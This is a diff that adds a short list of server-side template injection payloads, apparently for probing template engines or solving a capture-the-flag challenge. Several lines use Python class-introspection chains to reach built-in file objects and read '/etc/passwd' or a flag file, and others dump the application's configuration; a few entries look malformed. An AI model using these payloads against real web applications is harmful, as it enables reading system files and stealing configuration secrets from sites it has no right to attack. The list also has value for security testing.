@@ -1,0 +1,12 @@
+{{[].__class__.__base__.__subclasses__().pop(40)('etc/passwd').read() }}
+{{config.items()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+{{"".join(__class__)}} *
+{{"".join(class)}} * = *
+{{"".join(class)}} = blank
+{{self}}
+{{config}}
+{{2+2}}
+{{"Text"}}
+{{'abcd'.toUpperCase()}}
